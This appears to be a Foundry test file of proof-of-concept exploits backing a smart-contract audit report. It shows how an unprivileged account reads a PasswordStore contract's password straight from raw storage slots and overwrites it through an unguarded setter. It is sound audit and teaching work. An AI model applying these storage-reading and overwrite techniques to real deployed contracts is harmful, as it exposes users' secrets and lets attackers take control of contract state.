// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import {Test} from "forge-std/Test.sol";
import {PasswordStore} from "../src/PasswordStore.sol";

/**
 * @title PasswordStore POC
 * @notice Standalone proof-of-concept suite referenced by the audit report in
 *         `audit-reports/`. It intentionally lives in its own file so that the
 *         original test suite is left untouched.
 *
 *         Every test in this file PASSES against the audited revision, which is
 *         precisely the point: they demonstrate that the reported weaknesses are
 *         reachable by an unprivileged actor.
 */
contract PasswordStorePOCTest is Test {
    PasswordStore internal passwordStore;

    address internal constant OWNER = address(0xA11CE);
    address internal constant ATTACKER = address(0xBAD);

    function setUp() public {
        vm.prank(OWNER);
        passwordStore = new PasswordStore();
    }

    /*//////////////////////////////////////////////////////////////
                                  H-1
    //////////////////////////////////////////////////////////////*/

    /// @notice H-1: `getPassword` is access-controlled, but the secret it guards
    ///         is readable straight out of contract storage by anyone.
    function test_POC_H1_access_control_is_not_confidentiality() public {
        vm.prank(OWNER);
        passwordStore.setPassword("myPassword");

        // The access control does its job at the ABI level...
        vm.prank(ATTACKER);
        vm.expectRevert(PasswordStore.PasswordStore__NotOwner.selector);
        passwordStore.getPassword();

        // ...and is entirely irrelevant at the storage level.
        bytes32 raw = vm.load(address(passwordStore), bytes32(uint256(1)));
        assertEq(_decodeShortString(raw), "myPassword");
    }

    /// @notice H-1: retrieving the secret requires no privileges whatsoever.
    function test_POC_H1_anyone_reads_password_from_raw_storage() public {
        vm.prank(OWNER);
        passwordStore.setPassword("myPassword");

        // slot 0 => s_owner, slot 1 => s_password
        bytes32 raw = vm.load(address(passwordStore), bytes32(uint256(1)));

        assertEq(_decodeShortString(raw), "myPassword");
    }

    /// @notice H-1: passwords longer than 31 bytes are stored at the keccak256
    ///         of the slot and are equally recoverable.
    function test_POC_H1_long_password_is_equally_recoverable() public {
        string memory longPassword = "correct-horse-battery-staple-32bytes+";
        assertGt(bytes(longPassword).length, 31);

        vm.prank(OWNER);
        passwordStore.setPassword(longPassword);

        bytes32 lengthWord = vm.load(address(passwordStore), bytes32(uint256(1)));
        // Long strings encode `length * 2 + 1` in the slot itself.
        uint256 byteLength = (uint256(lengthWord) - 1) / 2;
        assertEq(byteLength, bytes(longPassword).length);

        bytes32 dataSlot = keccak256(abi.encode(uint256(1)));
        bytes memory recovered = new bytes(byteLength);
        for (uint256 i = 0; i < byteLength; ++i) {
            bytes32 word = vm.load(address(passwordStore), bytes32(uint256(dataSlot) + (i / 32)));
            recovered[i] = word[i % 32];
        }

        assertEq(string(recovered), longPassword);
    }

    /*//////////////////////////////////////////////////////////////
                                  H-2
    //////////////////////////////////////////////////////////////*/

    /// @notice H-2: `setPassword` performs no caller validation, so any account
    ///         can overwrite the owner's password.
    function test_POC_H2_anyone_overwrites_password() public {
        vm.prank(OWNER);
        passwordStore.setPassword("owner-password");

        vm.prank(ATTACKER);
        passwordStore.setPassword("attacker-password");

        vm.prank(OWNER);
        assertEq(passwordStore.getPassword(), "attacker-password");
    }

    /// @notice H-2: the overwrite is unrestricted for arbitrary callers.
    function test_POC_H2_set_password_is_unrestricted_fuzz(address caller) public {
        vm.assume(caller != OWNER);

        vm.prank(OWNER);
        passwordStore.setPassword("owner-password");

        vm.prank(caller);
        passwordStore.setPassword("attacker-password");

        vm.prank(OWNER);
        assertEq(passwordStore.getPassword(), "attacker-password");
    }

    /*//////////////////////////////////////////////////////////////
                                 helpers
    //////////////////////////////////////////////////////////////*/

    /// @dev Decodes a short string (<= 31 bytes) held in a single storage slot.
    function _decodeShortString(bytes32 data) internal pure returns (string memory) {
        uint256 length = uint256(uint8(data[31])) / 2;
        bytes memory buffer = new bytes(length);
        for (uint256 i = 0; i < length; ++i) {
            buffer[i] = data[i];
        }
        return string(buffer);
    }
}
